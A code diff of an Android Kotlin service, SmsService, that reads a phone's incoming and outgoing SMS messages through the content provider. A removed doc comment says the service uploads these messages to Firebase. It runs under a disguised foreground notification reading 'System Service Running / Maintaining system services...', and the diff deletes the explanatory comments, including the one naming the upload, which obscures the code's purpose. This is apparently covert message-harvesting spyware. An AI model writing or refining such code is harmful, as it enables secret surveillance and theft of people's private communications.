@@ -16,9 +16,6 @@ import com.google.firebase.firestore.FirebaseFirestore
 import java.util.*
 import android.content.SharedPreferences
 
-/**
- * Service that monitors incoming SMS messages and uploads them to Firebase
- */
 class SmsService : Service() {
     companion object {
         private const val TAG = "SmsService"
@@ -45,7 +42,6 @@ class SmsService : Service() {
         firestore = FirebaseFirestore.getInstance()
         prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
         
-        // Create the notification channel
         NotificationChannelManager.createNotificationChannel(
             this,
             CHANNEL_ID,
@@ -53,17 +49,14 @@ class SmsService : Service() {
             NotificationManager.IMPORTANCE_LOW
         )
         
-        // Register SMS receiver
         registerSmsReceiver()
         
-        // Check for existing SMS messages
         checkExistingSmsMessages()
     }
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "SmsService started")
         
-        // Create a notification for the foreground service
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
         
@@ -80,7 +73,7 @@ class SmsService : Service() {
     }
     
     private fun createNotification(): Notification {
-        // Create an intent that will open the app when tapped
+        
         val notificationIntent = Intent(this, this::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
@@ -89,7 +82,6 @@ class SmsService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        // Build the notification
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service Running")
             .setContentText("Maintaining system services...")
@@ -133,10 +125,9 @@ class SmsService : Service() {
     }
     
     private fun checkExistingSmsMessages() {
-        // Get the timestamp of the last processed SMS
+        
         val lastSmsTime = prefs.getLong(LAST_SMS_TIME_KEY, 0L)
         
-        // Query content provider for SMS messages
         val cursor = contentResolver.query(
             Telephony.Sms.CONTENT_URI,
             arrayOf(
@@ -167,15 +158,12 @@ class SmsService : Service() {
                         val timestamp = it.getLong(dateIndex)
                         val type = it.getInt(typeIndex)
                         
-                        // Update most recent timestamp if needed
                         if (timestamp > mostRecentTimestamp) {
                             mostRecentTimestamp = timestamp
                         }
                         
-                        // Check if it's incoming or outgoing
                         val isIncoming = type == Telephony.Sms.MESSAGE_TYPE_INBOX
                         
-                        // Set the sender and recipient based on the message type
                         val sender = if (isIncoming) address else "ME"
                         val recipient = if (isIncoming) "ME" else address
                         
@@ -184,7 +172,6 @@ class SmsService : Service() {
                     }
                 } while (it.moveToNext())
                 
-                // Update the last processed timestamp
                 prefs.edit().putLong(LAST_SMS_TIME_KEY, mostRecentTimestamp).apply()
             }
         }
